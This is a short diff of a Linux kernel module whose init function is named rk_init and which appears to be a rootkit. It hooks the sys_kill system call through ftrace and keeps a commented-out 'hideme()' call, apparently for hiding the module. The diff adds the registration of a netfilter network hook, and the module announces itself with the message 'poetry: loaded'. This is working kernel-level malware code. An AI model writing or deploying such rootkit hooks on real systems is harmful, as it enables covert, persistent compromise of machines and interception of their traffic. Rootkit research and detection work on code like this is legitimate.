@@ -4,14 +4,18 @@ static struct ftrace_hook hooks[] = {
         HOOK("sys_kill", hook_kill, &orig_kill),
 };
 
+
 static int __init rk_init(void){
-        //hideme();
+    // hideme();
     int err;
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if(err)
         return err;
 
     printk(KERN_INFO "poetry: loaded\n");
+
+    return nf_register_net_hook(&init_net, &my_nfho);
+
     return 0;
 }
 
